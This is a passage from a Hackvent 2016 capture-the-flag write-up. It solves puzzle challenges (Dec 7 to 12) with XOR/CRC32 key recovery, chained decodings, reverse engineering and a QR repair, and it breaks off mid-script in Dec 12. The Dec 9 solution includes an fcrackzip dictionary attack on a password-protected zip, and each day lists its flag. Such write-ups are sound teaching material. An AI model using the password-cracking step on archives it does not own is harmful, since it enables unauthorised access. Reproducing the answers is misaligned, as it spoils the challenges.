+    <span class="kd">var</span> <span class="nx">crcTable</span> <span class="o">=</span> <span class="nx">crcTable</span> <span class="o">||</span> <span class="p">(</span><span class="nx">crcTable</span> <span class="o">=</span> <span class="nf">makeCRCTable</span><span class="p">());</span>
+    <span class="kd">var</span> <span class="nx">crc</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">^</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">str</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="nx">crc</span> <span class="o">=</span> <span class="p">(</span><span class="nx">crc</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="nx">crcTable</span><span class="p">[(</span><span class="nx">crc</span> <span class="o">^</span> <span class="nx">str</span><span class="p">.</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="nx">i</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">];</span>
+    <span class="p">}</span>
+
+    <span class="k">return </span><span class="p">((</span><span class="nx">crc</span><span class="o">&amp;</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">secret</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="mi">2155568001</span><span class="p">,</span>
+    <span class="mi">3847164610</span><span class="p">,</span>
+    <span class="mi">2684356740</span><span class="p">,</span>
+    <span class="mi">2908571526</span><span class="p">,</span>
+
+    <span class="mi">2557362074</span><span class="p">,</span>
+    <span class="mi">2853440707</span><span class="p">,</span>
+    <span class="mi">3849194977</span><span class="p">,</span>
+    <span class="mi">3171764887</span>
+<span class="p">];</span>
+
+<span class="kd">var</span> <span class="nx">pass</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">aaa</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">s</span><span class="o">=</span><span class="dl">""</span><span class="p">;</span>
+<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">secret</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">pp</span><span class="o">=</span><span class="dl">""</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">secret</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">^</span> <span class="nf">crc32</span><span class="p">(</span><span class="nx">pass</span><span class="p">));</span> <span class="nx">p</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span> <span class="nx">p</span><span class="o">&gt;&gt;=</span><span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">pp</span> <span class="o">=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">p</span><span class="o">&amp;</span><span class="mh">0xFF</span><span class="p">)</span><span class="o">+</span><span class="nx">pp</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">pp</span><span class="p">);</span>
+    <span class="nx">s</span><span class="o">+=</span><span class="nx">pp</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nf">crc32</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2343675265</span><span class="p">){</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Right </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">s</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Wrong</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>It seems very plausible that each of these numbers corresponds to some portion of the output key. When crc32(pass) is negative, it fails completely, so</p><p>crc32(pass) needs to be positive.</p><p>The <code class="language-plaintext highlighter-rouge">for(var p...)</code> portion, if crc32(pass) is positive, will loop exactly 4 times. So this means that each of those numbers coresponds to 4 characters? We just need to find cases when a single input value produces outputs all within ascii range?</p><p>Hmm, that simplifies it a bit. E.g. the first 8 bits XOR first 8 bits of</p><p>crc32(pass), for all values of secret, must be within ascii. I’ve taken a stab at this in 7th-solver.js, but I think there are bugs.</p><p>The hint suggests maybe we don’t need to discover the password, we take another look and indeed, each part of the secret would appear to encode 4 characters of the nugget. We know what the first four characters should be, so we have</p><p><code class="language-plaintext highlighter-rouge">secret[0] ^ crc32(pass) = "HV16"</code></p><p>which means</p><p><code class="language-plaintext highlighter-rouge">crc32(pass) = secret[0] ^ "HV16"</code></p><p>so we can compute the value <code class="language-plaintext highlighter-rouge">crc32(pass)</code> directly, and we just need to xor this with each part of the secret with this to get the rest of the nugget!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="k">def</span> <span class="nf">int2ascii</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">hex_string</span> <span class="o">=</span> <span class="sh">'</span><span class="s">%x</span><span class="sh">'</span> <span class="o">%</span> <span class="n">i</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="n">hex_string</span><span class="p">.</span><span class="nf">zfill</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)))</span>
+
+
+<span class="n">secret</span><span class="o">=</span> <span class="p">[</span><span class="mi">2155568001</span><span class="p">,</span><span class="mi">3847164610</span><span class="p">,</span><span class="mi">2684356740</span><span class="p">,</span><span class="mi">2908571526</span><span class="p">,</span><span class="mi">2557362074</span><span class="p">,</span><span class="mi">2853440707</span><span class="p">,</span><span class="mi">3849194977</span><span class="p">,</span><span class="mi">3171764887</span><span class="p">]</span>
+
+<span class="n">crcpass</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="sh">"</span><span class="s">HV16</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">hex</span><span class="sh">"</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span> <span class="o">^</span> <span class="n">secret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+
+<span class="c1"># test that we indeed get the string "HV16" back
+</span><span class="n">nuggetpiece</span> <span class="o">=</span> <span class="n">secret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">^</span> <span class="n">crcpass</span>
+<span class="k">print</span> <span class="nf">int2bytes</span><span class="p">(</span><span class="n">nuggetpiece</span><span class="p">)</span>
+
+<span class="c1"># yay! now do it for all parts of the secret
+</span><span class="n">nugget</span><span class="o">=</span><span class="sh">''</span>
+<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">secret</span><span class="p">:</span>
+    <span class="n">nugget</span><span class="o">+=</span><span class="nf">int2ascii</span><span class="p">(</span><span class="n">s</span> <span class="o">^</span> <span class="n">crcpass</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">nugget</span>
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-bxuh-b3ep-1PCU-b9ft-CgVu </code><hr><h1 id="dec-8-lost-in-encoding"> Dec 8: Lost In Encoding <a href="/CTF-writeups-public/writeups/Hackvent_2016/08-dec-8--lost-in-encoding.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Multiple encodings = good encryption?</em></p><p>Santa and his elves do not know good encryption, all they have heard about are some basic encodings. Unfortunately they all are bungling and forgotten the recipe.</p><p>It’s now on you, who has to get it up. <a href="writeupfiles/l0st_1n_7ranslation.fun">file</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>=ybegin line=128 size=333 name=lost_in_translation_2.txt
+zr^\”„˜‚o„‘‚¤s^uZ€xt}¢l]’‹mžos£•œ{rl¤}_o„“[vka‚‚{•|”¢r|“cn~q_Z|ws[Z¡{~–—y£žo{•_xyoœ~£¤uZ£{n_mx“€pŽo{Ÿ—k¢{nžz¤€ov[’s
+u£žp€”™›|otzs•tq‚£x”wZ|uum••|x|¤šl€oš[t•|tƒ¡ {—žxyco}Z•“w•ka¤wš{nžm|‚xqu€l vol‚vq—uZxv”pl€}ƒ¡u•€”ƒo„n{n¡€“|l€otn|£cv„o—
+{——yqo „£—sZ‘”xZ™a{~kc|{¡„•xs”l|€”[—wq¢lq™ ~‚oY„ox“xZ™—wq€“w‚w¡}•’£”^g4
+=yend size=333 crc32=6389b315
+</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>yEnc decode (http://www.webutils.pl/index.php?idx=yenc)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>PH42WjZnXEZgXzI4K0VNJSxBU3UhaCtEIykrQHBzSW5EZi1cLUA7XXQkRjxHRi9DTG5Wc0RMI10wQTlm
+OytEQk5NOEUrTyczK0UyQD5CNiVFdEQuUmAxQDtePzVEL1hIKytFVjoqREJPIkJGXyNjM0RKKCkkRWNs
+RzpBVEp1JkRJYWwvQmtNOW9ES0kiMkA7WzMpQDtCRXNGKVBvLEBXLGUmK0NULjFBVSYwKkVjYEZDQDsw
+ViRBVEJDRy9LZEsmQmsmOGEvZysmI0gjN0o7QTA9RUQwZkNWIjBRVj1mMGxBcGovTXE/ZENiN0omMGVi
+MXMwSkhyfj4=
+</pre></table></code></div></div><p>base64 decode</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>&lt;~6Z6g\F`_28+EM%,ASu!h+D#)+@psInDf-\-@;]t$F&lt;GF/CLnVsDL#]0A9f;+DBNM8E+O'3+E2@&gt;B6%
+EtD.R`1@;^?5D/XH++EV:*DBO"BF_#c3DJ()$EclG:ATJu&amp;DIal/BkM9oDKI"2@;[3)@;BEsF)Po,@W,
+e&amp;+CT.1AU&amp;0*Ec`FC@;0V$ATBCG/KdK&amp;Bk&amp;8a/g+&amp;#H#7J;A0=ED0fCV"0QV=f0lApj/Mq?dCb7J&amp;0eb
+1s0JHr~&gt;
+</pre></table></code></div></div><p>base85 decode (https://www.tools4noobs.com/online_tools/ascii85_decode/)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>Computer science education cannot make anybody an expert programmer any more
+than studying brushes and pigment can make somebody an expert painter.
+- Eric S. Raymond HV16-l0st-1n7r-4nsl-4710-n00b
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-l0st-1n7r-4nsl-4710-n00b </code><hr><h1 id="dec-9-illegal-prime-number"> Dec 9: Illegal Prime Number <a href="/CTF-writeups-public/writeups/Hackvent_2016/09-dec-9-illegal-prime-number.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’ve heard something about illegal prime numbers… Maybe this number contains the flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>43158911230545192278004252344390244064068059909839469541549566950124312835516574175851795
+74642755601169096280017484467053951914982126613234225200384245049037787654523558017678649
+27807671610820027192757579149792909218423881361984672931551823792488162360311109497907128
+60174071535290430666553883163784576942915907036813417525614927231374744822633736732102486
+33961843479034160811982934510083276506238457901538373531195688165166964398815874378480986
+164601388393975141268984935852959700100872597068350527482364309
+</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Illegal primes or numbers are the idea that by making certain programs/files illegal, their numerical representation is also illegal. Therefore this number likely represents some files containing our flag.</p><p>Lets convert it to binary data:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">binascii</span>
+
+<span class="n">p</span><span class="o">=</span><span class="mi">4315891123054519227800425234439024406406805990983946954154956695012431283551657417585179574642755601169096280017484467053951914982126613234225200384245049037787654523558017678649278076716108200271927575791497929092184238813619846729315518237924881623603111094979071286017407153529043066655388316378457694291590703681341752561492723137474482263373673210248633961843479034160811982934510083276506238457901538373531195688165166964398815874378480986164601388393975141268984935852959700100872597068350527482364309</span>
+<span class="n">p2</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">p3</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">dec9out</span><span class="sh">"</span><span class="p">,</span><span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+    <span class="n">outfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">p2</span><span class="p">)</span>
+</pre></table></code></div></div><p>This gives us a <a href="writeupfiles/dec9.zip">zip file</a>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>file dec9out
+dec9out: Zip archive data, at least v2.0 to extract
+</pre></table></code></div></div><p>The zipfile is password protected, but is found easily using a dictionary attack:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>fcrackzip <span class="nt">-v</span> <span class="nt">--use-unzip</span> <span class="nt">-D</span> <span class="nt">-p</span> /path/to/wordlists/passwords dec9out
+found file <span class="s1">'Flag.txt'</span>, <span class="o">(</span>size <span class="nb">cp</span>/uc     43/    29, flags 9, chk 0a91<span class="o">)</span>
+checking pw buigts
+
+PASSWORD FOUND!!!!: pw <span class="o">==</span> qwerty
+</pre></table></code></div></div><p>So the password is <code class="language-plaintext highlighter-rouge">qwerty</code>. The <code class="language-plaintext highlighter-rouge">Flag.txt</code> file inside the zip file contained the flag.</p><h2> Flag</h2><code> HV16-0228-d75b-40cd-8a0e-1f3e </code><hr><h1 id="dec-10-i-want-to-play-a-game"> Dec 10: I want to play a Game <a href="/CTF-writeups-public/writeups/Hackvent_2016/10-dec-10-i-want-to-play-a-game.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Reversing Day 1: we’ll start with an easy one.</p><p><a href="writeupfiles/ReGame_Part1.zip">Gimme that thing!</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>we unzip the file and find and a playstation executable:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings HV16.EXE
+PS-X EXE
+Sony Computer Entertainment Inc. <span class="k">for </span>Japan area
+0123456789ABCDEF
+<span class="nv">$Id</span>: sys.c,v 1.140 1998/01/12 07:52:27 noda Exp yos <span class="err">$</span>
+
+<span class="o">[</span>..]
+
+wwc4<span class="err">$</span>
+decrypt the flag you n00b
+KR40<span class="k">*</span>^d?r!CdhX&lt;w<span class="nv">$\</span><span class="sb">`</span>B<span class="p">;</span>G
+T<span class="o">{</span>6<span class="k">*</span>,TW
+Library Programs <span class="o">(</span>c<span class="o">)</span> 1993-1997 Sony Computer Entertainment Inc., All Rights Reserved.
+</pre></table></code></div></div><p>Hmm, the string <code class="language-plaintext highlighter-rouge">KR40*^d?..</code> looks like it might be an encrypted flag, with some trial and error we find that</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">K</span><span class="sh">'</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">H</span><span class="sh">'</span><span class="p">)</span>
+<span class="mi">3</span>
+<span class="gp">&gt;&gt;&gt;</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">V</span><span class="sh">'</span><span class="p">)</span>
+<span class="mi">4</span>
+<span class="gp">&gt;&gt;&gt;</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
+<span class="mi">5</span>
+<span class="gp">&gt;&gt;&gt;</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="sh">'</span><span class="s">6</span><span class="sh">'</span><span class="p">)</span>
+<span class="mi">6</span>
+</pre></table></code></div></div><p>Ok, that’s a clear pattern! Let’s do it for the whole string!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="n">s</span><span class="o">=</span><span class="sh">"</span><span class="s">KR40*^d?r!CdhX&lt;w$`B;G</span><span class="se">\x7f</span><span class="s">T{6*,TW</span><span class="sh">"</span>
+
+<span class="n">pt</span><span class="o">=</span><span class="sh">''</span>
+<span class="n">count</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">pt</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">count</span><span class="p">)</span>
+    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+
+<span class="k">print</span> <span class="n">pt</span>
+</pre></table></code></div></div><h2> Flag</h2><code> HV16-Vm5y-NjgH-e7tW-PgMa-61JH </code><hr><h1 id="dec-11-a-maze-ing-gift"> Dec 11: A-maze-ing GIFt <a href="/CTF-writeups-public/writeups/Hackvent_2016/11-dec-11-a-maze-ing-gift.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Go find the codes!</em></p><p>Will you manage to recover today’s code from this strange picture?</p><p>It looks like a maze of some kind, and somewhere deep inside there might be more than what you’d expect at the first glance…</p><p><img src="writeupfiles/MandM.gif" alt="" /></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This is clearly a QR code we have to fix, the title hints at a maze. We see some lines are very light and not clear to the naked eys, so we make anything that is not white black:</p><p><img src="writeupfiles/dec11_outimg.png" alt="" /></p><p>Now we simply start coloring the corners, and any areas adjacent to black we make white and vice versa to get the nugget:</p><p><img src="writeupfiles/MandM_colored.png" alt="" /></p><h2> Flag</h2><code> HV16-otli-KbAg-MDVb-TMTO-WTDI </code><hr><h1 id="dec-12-crypt-o-math"> Dec 12: Crypt-o-Math <a href="/CTF-writeups-public/writeups/Hackvent_2016/12-dec-12-crypt-o-math.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Crypto? Math? Maybe both?</em></p><p>you remember math classes at school?</p><p>hopefully you payed attention - and even if not, there are other ways to solve this challenge.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>-----BEGIN HV16 CHALLENGE-----
+m,b,p
+260492575707724061121829547730531689268,219331109722881671601619265628380637246,264919855316001119104226076800779561423
+177037883108301921298501682022541052670,139010999389216475313896172223515984938,320424365363679773525372180610490277297
+201530751445587644733838605908487065258,156283960365344379794603462644218812025,260817421396746284411005790925469586671
+243507266865305317073588348849175479231,228672633794460367905186619683512549913,311961837617653522368820984616392093801
+235979373536480839808082706396503872744,193357134507240975900584464141934560197,272109227670221371468387040437351965901
+230551569853098007600677345727280344755,287930781315318970473254677546577038359,267938315516895485484707051396200706443
+243574932572443222972750303823800502163,301120142698243924290763614435454565780,298644815229643145404450351035804160241
+227879528304283891530899499744980291425,259647428751561260984852593239590962832,269635859822490692863508746527322139429
+193780289185955117334123511554895799539,230518059194860774985531587526031582924,207593226880414101384701594893426311937
+195425447990038725090924967791915486200,211074736770197591575170253798012315012,268179617336236355437933191393015865423
+182160695615960388203641943769582257756,226052690185182197055109796183513576908,206467790630567275126889799309355179359
+270365608703884312725165910007312396490,213419845252996446560398094913250521674,324158008615298179424325819513870548587
+201137118708843924452456973486310609161,159816376238003107002192693657105630045,290037217831618223964293971372160917859
+173038113384777542289872672569239525188,189558894159177271916644208007912631998,183921485447992361971839173200969564297
+203079462849536394511816713024005910404,265255113893859933710071781082768935284,214860441818087898101519465166073705553
+175435955454496700514946039667711586185,321302129754052602637931061925096198926,176882035352883165226937995777991718197
+200701714682593432395729715130128082931,240366172083509768840032993181552166546,262938198945065824235502495190974734479
+299752902236935158362307014205359355636,235711956783855914923056820687273121476,332555996220370247549433065033032955347
+215902963387633985679795544753434436743,271635699405692295953353834140161222963,234686602415496986215568540582391915559
+205034325176731455396463659428717818520,272071326791294957481838950480920388378,206409649750015144058460651952033121471
+186202058515529112089774144624697652752,254056783751113612320599805874190538383,203950808577618100941828939328974427763
+287901749499474956286121649902808545796,182193516067311697257425115832952178725,310661715406253093730218700854274682783
+188797174721730846063832466557549096934,204289631640363328059573883403131553162,202398097602736311826665715995283701469
+173276488624612107075891981111532248427,143340215883386310219352729908142093188,310272112653851647580237588097526878451
+300899937001700644581647299928269672025,333680929290782211826332325236347007941,313491113294105066840003438756384124923
+179363152345949876980223861387117154037,192660289980311571512766813788452507319,191173487237342005980035033206582186319
+274297779066581320003362916911839787292,230968818301666954768423827202499074222,280249595392717543321356899242915413241
+173512792712172909456131993539106342879,276670255129140880258696821649524107343,176080436791985260266403840744627297429
+217267141898619422837859646397422811530,192415481924499182031594124394175595334,261771203728758901533499406756951694139
+m = a * 0x1337 * b % p
+a=flag
+-----END HV16 CHALLENGE-----
+</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Seems clear we would need to find <code class="language-plaintext highlighter-rouge">a</code> for each set of <code class="language-plaintext highlighter-rouge">(m,b,p)</code>, since there are 29 such tuples, it is safe to assume each encodes one letter of the flag.</p><p>There is surely a direct way to compute this, but my modular arithmetic is a bit rusty, so just going to bruteforce it:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+</pre><td class="rouge-code"><pre><span class="n">cts</span><span class="o">=</span><span class="p">[[</span><span class="mi">260492575707724061121829547730531689268</span><span class="p">,</span><span class="mi">219331109722881671601619265628380637246</span><span class="p">,</span><span class="mi">264919855316001119104226076800779561423</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">177037883108301921298501682022541052670</span><span class="p">,</span><span class="mi">139010999389216475313896172223515984938</span><span class="p">,</span><span class="mi">320424365363679773525372180610490277297</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">201530751445587644733838605908487065258</span><span class="p">,</span><span class="mi">156283960365344379794603462644218812025</span><span class="p">,</span><span class="mi">260817421396746284411005790925469586671</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">243507266865305317073588348849175479231</span><span class="p">,</span><span class="mi">228672633794460367905186619683512549913</span><span class="p">,</span><span class="mi">311961837617653522368820984616392093801</span><span class="p">],</span>
+<span class="p">[</span><span class="mi">235979373536480839808082706396503872744</span><span class="p">,</span><span class="mi">193357134507240975900584464141934560197</span><span class="p">,</span><span class="mi">272109227670221371468387040437351965901</span><span class="p">],</span>
